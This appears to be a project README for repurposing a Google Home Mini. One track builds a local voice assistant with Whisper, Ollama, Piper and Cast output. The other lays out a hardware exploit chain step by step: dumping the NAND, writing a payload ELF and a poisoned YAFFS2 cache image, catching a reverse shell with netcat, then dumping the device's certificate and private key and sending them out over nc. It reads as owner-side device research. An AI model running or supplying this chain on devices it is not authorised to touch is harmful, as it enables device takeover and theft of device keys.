# Reconstruction — full build plan

Two tracks. Do them in this order.

---

## Track A — Working voice bot (this weekend, no firmware risk)

The Mini is a Cast speaker. Your Pi + DeepSeek is the brain. You add a mic.

```
mic (ESP32-S3 / ReSpeaker / USB)
  → openWakeWord (wake word)
  → faster-whisper (STT)
  → DeepSeek via Ollama (LLM, on Pi)
  → MCP client pool (any MCP servers)
  → Piper (TTS)
  → pychromecast → Mini speaker
```

### Setup

```bash
# 1. Install system deps on the Pi
sudo apt install piper ffmpeg python3-pip

# 2. Download Piper voice model (French or English)
mkdir -p ~/.local/share/piper
# FR: https://github.com/rhasspy/piper/releases — upmc-pierre-medium.onnx
# EN: en_US-lessac-medium.onnx

# 3. Install Python deps in the project venv
source ../../.venv/bin/activate
pip install -r requirements.txt

# 4. Edit config.py:
#   - TTS_CAST_URL_BASE: your Pi's LAN IP
#   - CAST_DEVICE: "GoogleHome4983" (set after provisioning)
#   - OLLAMA_HOST: http://localhost:11434
#   - OLLAMA_MODEL: deepseek-r1:7b (or whatever you have)
#   - PIPER_MODEL: path to .onnx voice model
#   - WHISPER_LANG: "fr" (device is FR locale)

# 5. Test TTS → Cast (Mini must be provisioned and on LAN first)
python agent/main.py --list-cast
python agent/main.py --say "Bonjour, je suis votre assistant local."

# 6. Start the full voice loop
python agent/main.py
```

### Add MCP servers (config.py)

```python
MCP_SERVERS = [
    # Filesystem tools
    {"name": "filesystem", "command": "npx",
     "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/pi"]},
    # Home Assistant (if you run it)
    {"name": "homeassistant", "command": "npx",
     "args": ["-y", "@modelcontextprotocol/server-homeassistant"],
     "env": {"HA_URL": "http://localhost:8123", "HA_TOKEN": "your-token"}},
]
```

---

## Track B — Firmware access (weeks, hardware required)

### Phase 1 — Controlled AP + OTA capture (before provisioning)

```bash
# On the Pi:
cd ap/
sudo bash setup_ap.sh start       # brings up wlan1 as WPA2 AP

# In a second terminal:
sudo bash capture_ota.sh          # starts tshark, Ctrl-C to analyse

# Then provision the Mini on this AP via the Google Home app.
# After the device fetches OTA, capture_ota.sh will print the URLs.
```

This gives you:
- The device's IP address
- TLS SNI hostnames → OTA endpoint URL (model + build ID in the path)
- `build_version` from `eureka_info` → confirms kernel date

```bash
curl -s "http://<mini-ip>:8008/setup/eureka_info?options=detail" | python3 -m json.tool
```

### Phase 2 — NandBug hardware build

```bash
git clone https://github.com/courk/NandBug-Hardware
git clone https://github.com/courk/NandBug-Software
# Order PCBs from JLCPCB using the gerbers in NandBug-Hardware
# Parts: ICE40HX1K-TQ144 + FT2232H + passives (~€30 total, ~$15 PCB)
# Solder the board, install in-circuit as a NAND interposer

# Dump the full NAND (256 MB):
python NandBug-Software/nandbug.py dump --out evidence/nand-full.bin
```

### Phase 3 — Exploit (if kernel ≤ 2021)

```bash
# 1. Build the payload ELF (edit PI_IP in payload/agent_elf.c first):
cd payload/
bash build.sh          # produces payload_elf (needs arm-linux-gnueabi-gcc)

# 2. Write payload to factory_store:
python NandBug-Software/nandbug.py write \
    --partition factory_store --file payload_elf --dest factory_setting/s

# 3. Build and write the poisoned cache image:
cd ../exploit/
python craft_cache.py  # produces poisoned-cache.yaffs2
python NandBug-Software/nandbug.py write \
    --partition cache --in poisoned-cache.yaffs2

# 4. Start a reverse shell listener on the Pi:
nc -lvp 4444

# 5. Power-cycle the Mini. Retry up to ~20 times (5-10% success per boot).
```

### Phase 4 — After root shell

```bash
# From the reverse shell on the Mini:
mount -o remount,rw /
cat /proc/cpuinfo                   # confirm SoC, model
cat /proc/mtd                       # partition map
nanddump -f /tmp/factory_store.bin /dev/mtd10  # save device cert + key
# Transfer factory_store.bin to Pi:
nc <pi-ip> 4445 < /tmp/factory_store.bin
# (On Pi: nc -lvp 4445 > evidence/factory_store.bin)

# Then use REA + Ghidra on cast_shell:
cp /usr/local/bin/cast_shell /tmp/
# Transfer and analyse:
#   source ../../scripts/rea-env.sh
#   rea analyze evidence/cast_shell --provider ghidra --json
```

---

## File layout

```
agent/          Track A voice bot (Python)
  main.py       entry point
  config.py     all configuration — edit this
  voice_loop.py wake → STT → LLM → TTS → Cast
  cast_out.py   pychromecast output
  tts.py        Piper TTS + HTTP serving
  stt.py        faster-whisper STT
  wake.py       openWakeWord detection
  llm.py        Ollama LLM + tool routing
  mcp_pool.py   MCP client pool

ap/             Controlled AP for OTA capture
  setup_ap.sh   hostapd + dnsmasq + NAT setup
  hostapd.conf  WPA2 AP config (edit SSID + passphrase)
  capture_ota.sh  tshark capture + analysis

exploit/        YAFFS2 exploit chain
  README.md     step-by-step with all parameters
  craft_cache.py  builds the poisoned YAFFS2 image

payload/        Root payload
  agent_elf.c   reverse shell + init.d hook (edit PI_IP)
  build.sh      cross-compile for ARM
```
